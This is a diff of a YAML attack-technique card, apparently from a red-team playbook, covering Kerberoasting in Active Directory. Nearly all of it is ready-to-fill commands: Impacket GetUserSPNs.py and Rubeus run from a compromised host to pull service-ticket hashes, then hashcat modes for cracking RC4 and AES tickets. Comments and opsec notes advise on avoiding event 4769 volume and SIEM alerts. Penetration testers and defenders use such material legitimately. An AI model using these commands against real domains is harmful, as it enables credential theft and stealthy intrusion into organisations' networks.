@@ -1,23 +1,33 @@
 name: Kerberoasting
 description: Request TGS tickets for accounts with SPNs and crack offline
 commands:
-- '# Impacket - request all SPN tickets'
+- '# === LINUX/REMOTE (Impacket) ==='
+- ''
+- '# Request tickets for ALL kerberoastable users (noisy, but comprehensive)'
 - GetUserSPNs.py -request -dc-ip <DC_IP> '<DOMAIN>/<YOUR_USER>:<YOUR_PASSWORD>'
 - ''
-- '# Impacket - target specific user'
-- GetUserSPNs.py -request -dc-ip <DC_IP> '<DOMAIN>/<YOUR_USER>:<YOUR_PASSWORD>' -target-user '<TARGET_USER>'
+- '# Request ticket for specific user only (stealthier, fewer 4769 events)'
+- GetUserSPNs.py -request -dc-ip <DC_IP> '<DOMAIN>/<YOUR_USER>:<YOUR_PASSWORD>' -request-user '<TARGET_USER>'
 - ''
-- '# Rubeus - all SPNs'
+- '# Save hashes directly to file for cracking'
+- GetUserSPNs.py -request -dc-ip <DC_IP> '<DOMAIN>/<YOUR_USER>:<YOUR_PASSWORD>' -outputfile hashes.txt
+- ''
+- '# === WINDOWS (Rubeus) - run from compromised host ==='
+- ''
+- '# Request tickets for all SPNs (/nowrap = single-line hash output for cracking)'
 - Rubeus.exe kerberoast /outfile:hashes.txt /nowrap
 - ''
-- '# Rubeus - target specific user'
+- '# Target specific high-value user (use when OPSEC matters)'
 - Rubeus.exe kerberoast /user:<TARGET_USER> /outfile:hashes.txt /nowrap
 - ''
-- '# bloodhound.py - discover SPNs during collection'
-- bloodhound.py -u '<YOUR_USER>' -p '<YOUR_PASSWORD>' -d '<DOMAIN>' -dc '<DC_IP>' -c All
+- '# === CRACK OFFLINE ==='
 - ''
-- '# Crack with hashcat'
+- '# Hashcat mode 13100 = Kerberos 5 TGS-REP etype 23 (RC4)'
 - hashcat -m 13100 hashes.txt wordlist.txt
+- ''
+- '# For AES-encrypted tickets (etype 17/18) - less common but more secure'
+- hashcat -m 19600 hashes.txt wordlist.txt  # etype 17 (AES128)
+- hashcat -m 19700 hashes.txt wordlist.txt  # etype 18 (AES256)
 opsec:
 - TGS requests generate Kerberos event 4769 (Service Ticket Request)
 - High volume of TGS requests may trigger SIEM alerts
